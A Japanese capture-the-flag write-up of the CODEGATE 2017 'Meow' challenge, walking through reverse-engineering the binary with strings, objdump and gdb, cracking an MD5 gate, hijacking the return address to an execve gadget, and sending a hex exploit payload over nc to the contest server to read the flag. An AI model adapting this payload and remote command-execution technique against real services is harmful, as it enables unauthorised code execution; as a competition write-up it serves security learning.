## CODEGATE 2017 CTF write-up

- http://ctf.codegate.org/
- うさぎさんの率いるチーム`CTF wo Suru`に参加させてもらった
- 自分はMeow(365pt)が解けたのでそれのメモ
- ちなみに全体では640ptの51位だった

### 問題の内容
ncの接続情報と、その先で動いているであろうバイナリmeowが与えられた。

ncでつないでみると、
```
***** hello? *****
>>>
```
と聞かれて入力待ちになり、何か入力してEnterを押すと
```
Sorry, bye!
```
と言われてしまう。いろいろ試したけど変化なし。かなしい。

### とりあえずfile
```
$ file meow
meow: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=7a30c5928478a8c94c289d9ec3ee54118227f2e8, stripped
```
お、ELFで64bitでx86-64じゃん！じゃあubuntuで動くかな、と思って`vagrant up`して仮想マシンをたてた。実行したらncで繋いだときと同様に動作したのでいろいろできそう。

### 何も考えずにstrings
```
$ strings meow
/lib64/ld-linux-x86-64.so.2
libcrypto.so.1.0.0
（中略）
Did you choose an angelfish??????
Angelfish is not an angel :(
Did you choose a bear????
Bear loves a beer s2
Did you choose a dog???
DoggoDDoggoD XD
- What kind of pet would you like to have?
- Select the number of pet!
1. angelfish
2. bear
3. cat
4. dog
5. I don't want pets
# number = 
*** bad number ***
mmap
***** hello? *****
>>> 
Sorry, bye!
（中略）
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
（以降略）
```
helloの関門を突破すればいろいろ出てきそうな感じのstringsだった。
いくつか取り出して試してみたけれど全部`Sorry, bye!`といわれてしまった。

### objdumpの出番

x86アセンブリなら少し読めるので、みんな大好きobjdumpをした.

```
$ objdump -d meow

meow:     file format elf64-x86-64


Disassembly of section .init:

00000000000009a0 <.init>:
 9a0:	48 83 ec 08          	sub    $0x8,%rsp
 9a4:	48 8b 05 2d 16 20 00 	mov    0x20162d(%rip),%rax        # 201fd8 <mmap@plt+0x201528>
 9ab:	48 85 c0             	test   %rax,%rax
 9ae:	74 05                	je     9b5 <MD5_Init@plt-0x1b>
 9b0:	e8 0b 01 00 00       	callq  ac0 <mmap@plt+0x10>
 9b5:	48 83 c4 08          	add    $0x8,%rsp
 9b9:	c3                   	retq   

Disassembly of section .plt:

（中略）

Disassembly of section .text:

0000000000000ad0 <.text>:
     ad0:	31 ed                	xor    %ebp,%ebp
     ad2:	49 89 d1             	mov    %rdx,%r9
     ad5:	5e                   	pop    %rsi
     ad6:	48 89 e2             	mov    %rsp,%rdx
     ad9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
     add:	50                   	push   %rax
     ade:	54                   	push   %rsp
     adf:	4c 8d 05 8a 0c 00 00 	lea    0xc8a(%rip),%r8        # 1770 <mmap@plt+0xcc0>
     ae6:	48 8d 0d 13 0c 00 00 	lea    0xc13(%rip),%rcx        # 1700 <mmap@plt+0xc50>
     aed:	48 8d 3d 05 0a 00 00 	lea    0xa05(%rip),%rdi        # 14f9 <mmap@plt+0xa49>
     af4:	e8 57 ff ff ff       	callq  a50 <__libc_start_main@plt>
     af9:	f4                   	hlt    
     afa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
     b00:	48 8d 3d 99 15 20 00 	lea    0x201599(%rip),%rdi        # 2020a0 <_edata>
     b07:	48 8d 05 99 15 20 00 	lea    0x201599(%rip),%rax        # 2020a7 <_edata+0x7>
     b0e:	55                   	push   %rbp
     b0f:	48 29 f8             	sub    %rdi,%rax
     b12:	48 89 e5             	mov    %rsp,%rbp
     b15:	48 83 f8 0e          	cmp    $0xe,%rax
     b19:	76 15                	jbe    b30 <mmap@plt+0x80>
     b1b:	48 8b 05 c6 14 20 00 	mov    0x2014c6(%rip),%rax        # 201fe8 <mmap@plt+0x201538>
     b22:	48 85 c0             	test   %rax,%rax
     b25:	74 09                	je     b30 <mmap@plt+0x80>

（以降略）
```

`MD5_Init`とか書かれているあたり、MD5ハッシュが一致したら通過できそう。

### 唯一の武器gdb
ということでgdbの出番。最初の入力を受け取るところでattachして追跡。
入力を受け取った後のソースはこの部分
```
# ここにとんできた i
# rdi, raxに入力文字列のアドレスが入ってる
    13c5:	55                   	push   %rbp
    13c6:	48 89 e5             	mov    %rsp,%rbp
    13c9:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
    13d0:	48 89 bd 68 ff ff ff 	mov    %rdi,-0x98(%rbp)
    13d7:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    13de:	48 b8 9f 46 a9 24 22 	movabs $0x618f652224a9469f,%rax
    13e5:	65 8f 61 
    13e8:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    13ec:	48 b8 a8 0d de e7 8e 	movabs $0x14b97d8ee7de0da8,%rax
    13f3:	7d b9 14 
    13f6:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    13fa:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
    1401:	48 89 c7             	mov    %rax,%rdi
    1404:	e8 c7 f5 ff ff       	callq  9d0 <MD5_Init@plt>
    1409:	48 8b 8d 68 ff ff ff 	mov    -0x98(%rbp),%rcx
    1410:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
    1417:	ba 0a 00 00 00       	mov    $0xa,%edx	# size = 10
    141c:	48 89 ce             	mov    %rcx,%rsi	# buf
    141f:	48 89 c7             	mov    %rax,%rdi	# ctx
    1422:	e8 d9 f5 ff ff       	callq  a00 <MD5_Update@plt>
    1427:	48 8d 95 70 ff ff ff 	lea    -0x90(%rbp),%rdx
    142e:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    1432:	48 89 d6             	mov    %rdx,%rsi	# hash!!!
    1435:	48 89 c7             	mov    %rax,%rdi	# ctx
    1438:	e8 33 f6 ff ff       	callq  a70 <MD5_Final@plt>
# 元のrsi番地に入力のMD5が入る（ここではrsi-0x58だけど）
    143d:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
    1441:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    1445:	ba 10 00 00 00       	mov    $0x10,%edx	# len
    144a:	48 89 ce             	mov    %rcx,%rsi	# s2
    144d:	48 89 c7             	mov    %rax,%rdi	# s1
# rdiに入力から計算したハッシュが入ってる
# rsi -> 9f46a92422658f61a80ddee78e7db914
```
入力の先頭10文字分のMD5がrdiの指す先に入っていた。
また、rsiの指す先には`9f46a92422658f61a80ddee78e7db914`というハッシュ値が入っていて、この二つが一致すれば最初の関門を突破できそうだということがわかった。

いろいろサイトを巡ってhashcatまで試したけどダメであきらめかけたところで、ついにみつけた。

- [http://www.md5online.org/](http://www.md5online.org/)

曰く、`$W337k!++y`が元の文字列とのこと。ちょうど10文字だ！（歓喜）

### 次の関門
ということでhello!の関門を突破したところ、以下のような出力が。
```
- What kind of pet would you like to have?
- Select the number of pet!
1. angelfish
2. bear
3. cat
4. dog
5. I don't want pets
# number = 
```
いろいろ入力して動きをたどった結果、3番以外を選択するとメッセージがでてすぐ終了してしまうが、
3番だけはさらにもう一段階あった。

```
Did you choose a cat?????
What type of cat would you prefer? '0'
>>>
```
やっぱMeowだけにネコなのか、と思いつつ、何も入力せずにEnterを押したところ、
```
Illegal instruction (core dumped)
```
めちゃくちゃ怪しい。
いろいろ入力をいじると、Segmentation Faultになる場合もあることがわかった。

というかそもそも、`Did you choose a cat?????`とかいう文字列、stringsで出てきてなかったよ？

ということで追跡したところ、こういうコードに到達していることがわかった。

```
   0x12000:	push   %rbp
   0x12001:	mov    %rsp,%rbp
   0x12004:	sub    $0x60,%rsp
   0x12008:	movabs $0x20756f7920646944,%rax
   0x12012:	mov    %rax,-0x60(%rbp)
   0x12016:	movabs $0x612065736f6f6863,%rax
   0x12020:	mov    %rax,-0x58(%rbp)
   0x12024:	movabs $0x3f3f3f3f74616320,%rax
   0x1202e:	mov    %rax,-0x50(%rbp)
   0x12032:	movabs $0x7420746168570a3f,%rax
   0x1203c:	mov    %rax,-0x48(%rbp)
   0x12040:	movabs $0x6320666f20657079,%rax
   0x1204a:	mov    %rax,-0x40(%rbp)
   0x1204e:	movabs $0x646c756f77207461,%rax
   0x12058:	mov    %rax,-0x38(%rbp)
   0x1205c:	movabs $0x65727020756f7920,%rax
   0x12066:	mov    %rax,-0x30(%rbp)
   0x1206a:	movabs $0x273027203f726566,%rax
   0x12074:	mov    %rax,-0x28(%rbp)
   0x12078:	movl   $0x3e3e3e0a,-0x20(%rbp)
   0x1207f:	movb   $0x0,-0x1c(%rbp)
   0x12083:	lea    -0x60(%rbp),%rax
   0x12087:	mov    $0x44,%edx
   0x1208c:	mov    %rax,%rsi
   0x1208f:	mov    $0x1,%edi
   0x12094:	mov    $0x1,%eax
   0x12099:	syscall 
   0x1209b:	lea    0x8(%rbp),%rax
   0x1209f:	mov    $0x18,%edx
   0x120a4:	mov    %rax,%rsi
   0x120a7:	mov    $0x0,%edi
   0x120ac:	mov    $0x0,%eax
   0x120b1:	syscall 
   0x120b3:	nop
   0x120b4:	leaveq 
   0x120b5:	retq   
```
このretqでの戻り先が、どうやら入力に依存して変化するらしい。

と思ったら、単純に入力の先頭8バイトと一致していた。

これがRIPとれたってことか！（はじめての感動）

### で、RIPとれたけど、どこに飛ばす？

ここで困り果ててしまった。

プログラム本体でROPチェーンを組むのか？
でもそもそも固定アドレスにロードされるわけではないからうまくいかない気がする。
それに使えそうなコードもなさそうだし…。

ここで思い出した。
そう、mmapという存在を。

### きっとgdbにはあるだろう！と思ったらあった
このプログラム、何度も何度もmmapを呼び出しているのですごく怪しかった。

マップされている状況を見れば何かわかるかも…と思ってgdbのコマンドを調べたら、ありました。

```
info proc mappings
```

これを、`What type of cat would you prefer?`の直後の入力待ちで実行した結果

```
(gdb) info proc mappings
process 1658
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
             0x12000            0x13000     0x1000        0x0 
             0x14000            0x15000     0x1000        0x0 
      0x7fa4273fd000     0x7fa427400000     0x3000        0x0 /lib/x86_64-linux-gnu/libdl-2.19.so
      0x7fa427400000     0x7fa4275ff000   0x1ff000     0x3000 /lib/x86_64-linux-gnu/libdl-2.19.so
      0x7fa4275ff000     0x7fa427600000     0x1000     0x2000 /lib/x86_64-linux-gnu/libdl-2.19.so
（以下略）
```

あやしい。明らかに怪しいのが二つ。

`0x12000-0x13000`と`0x14000-0x15000`

`0x12000-0x13000`は先ほどのコードなので、もう片方を`x/64i 0x14000`して表示したところ、以下の逆アセンブルが得られた。

```
   0x14000:	push   %rbp
   0x14001:	mov    %rsp,%rbp
   0x14004:	sub    $0x10,%rsp
   0x14008:	mov    %rdi,-0x8(%rbp)
   0x1400c:	mov    -0x8(%rbp),%rax
   0x14010:	mov    $0x0,%edx
   0x14015:	mov    $0x0,%esi
   0x1401a:	mov    %rax,%rdi
   0x1401d:	mov    $0x3b,%eax
   0x14022:	syscall 
   0x14024:	nop
   0x14025:	leaveq 
   0x14026:	retq   
   0x14027:	add    %al,(%rax)
   0x14029:	(bad)  
   0x1402a:	(bad)  
   0x1402b:	imul   $0x6873,0x2f(%rsi),%ebp
   0x14032:	add    %al,(%rax)
   0x14034:	add    %al,(%rax)
   0x14036:	pop    %rdi
   0x14037:	retq   
（以下略）
```

`mov    $0x3b,%eax`を見つけて、本当に嬉しかった。そうです。みんなが探し求める`syscall 59: execve`です！

そして、後ろの命令列も`(bad)`とか出ててあやしいので文字列として表示したところ、0x14029から`/bin/sh`という文字列が格納されていることが判明！

### ここからが少しかかった

ということで、状況をまとめると以下のような感じに。

- 0x14000番地からのコードでexecveが呼べそう
- 最後の入力の先頭8バイトで任意の番地に飛ばせる
- 0x14029に`/bin/sh`がある

あとは、

- execveに渡すargv
- なんとかして`$rdi=0x14029`とする方法

さえ見つければ、シェルをとれそうです。

いろいろ試した結果、どうも`0x14000-0x14008`の命令列はゴミで、`0x1400c`に飛ばすとうまく`$rdi=0x14029`となり、さらになんと入力文字列の25文字目以降がうまくargvに指定されることがわかりました。

というわけで、以下の攻撃コードを`exploit.bin`として保存して

（先頭13バイトは、二つ目までの入力に対する応答に相当します。）
```
0000000: 24 57 33 33 37 6b 21 2b 2b 79 0a 33 0a 0c 40 01  $W337k!++y.3..@.
0000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 29 40 01  .............)@.
0000020: 00 00 00 00 00 00 6c 73                          ......ls
```

以下のように食べさせてあげると
```
cat exploit.bin | nc 110.10.212.139 50410
```

以下の出力が得られました。
```
fflag
whatpet
```

結果、以下の攻撃コードで
```
0000000: 24 57 33 33 37 6b 21 2b 2b 79 0a 33 0a 0c 40 01  $W337k!++y.3..@.
0000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 29 40 01  .............)@.
0000020: 00 00 00 00 00 00 63 61 74 20 66 66 6c 61 67 0a  ......cat fflag.
```
無事フラグを得ました。
```
flag{what a lovely kitty!}
```

### ちなみに
- もうひとつのファイル`whatpet`は、配布されていたバイナリ`meow`と全く同じファイルでした。
- サーバーのバージョンは`Ubuntu 16.04.1`でした。（結構長いコマンドも実行できてしまった）
- 実行ユーザーは`pet2`で、私が見たときには他に`pet`というユーザーがssh経由でログインしていました。
 
### まとめ
- はじめてそれなりにまともな問題を一人で解けた
- めっちゃCTFたのしい
